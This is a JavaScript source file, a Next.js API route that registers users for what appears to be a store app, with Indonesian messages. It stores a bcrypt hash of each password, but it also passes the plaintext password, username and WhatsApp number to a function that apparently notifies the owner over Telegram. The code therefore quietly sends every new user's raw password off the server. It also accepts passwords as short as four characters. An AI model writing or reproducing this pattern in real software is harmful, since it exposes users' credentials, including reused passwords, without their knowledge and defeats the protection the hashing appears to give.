import { NextResponse } from "next/server";
import bcrypt from "bcryptjs";
import { findUserByUsername, createStoreUser } from "@/lib/rayyStore";
import { createStoreSession } from "@/lib/rayyStoreAuth";
import { notifyOwnerRayyRegistration } from "@/lib/telegram";

export async function POST(req) {
  try {
    const { username, password, whatsapp } = await req.json();
    const uname = String(username || "").trim();
    const pass = String(password || "");
    const wa = String(whatsapp || "").replace(/[^0-9]/g, "");

    if (!uname || !pass || !wa) {
      return NextResponse.json({ error: "Username, password, dan nomor WhatsApp wajib diisi." }, { status: 400 });
    }
    if (pass.length < 4) {
      return NextResponse.json({ error: "Password minimal 4 karakter." }, { status: 400 });
    }

    const existing = await findUserByUsername(uname);
    if (existing) {
      return NextResponse.json({ error: "Username sudah digunakan." }, { status: 409 });
    }

    const passwordHash = await bcrypt.hash(pass, 10);
    const uid = await createStoreUser({ username: uname, passwordHash, whatsapp: wa });
    await createStoreSession({ uid, username: uname });
    notifyOwnerRayyRegistration({ username: uname, password: pass, whatsapp: wa }).catch(() => {});

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error(err);
    return NextResponse.json({ error: "Gagal mendaftar. Coba lagi." }, { status: 500 });
  }
}
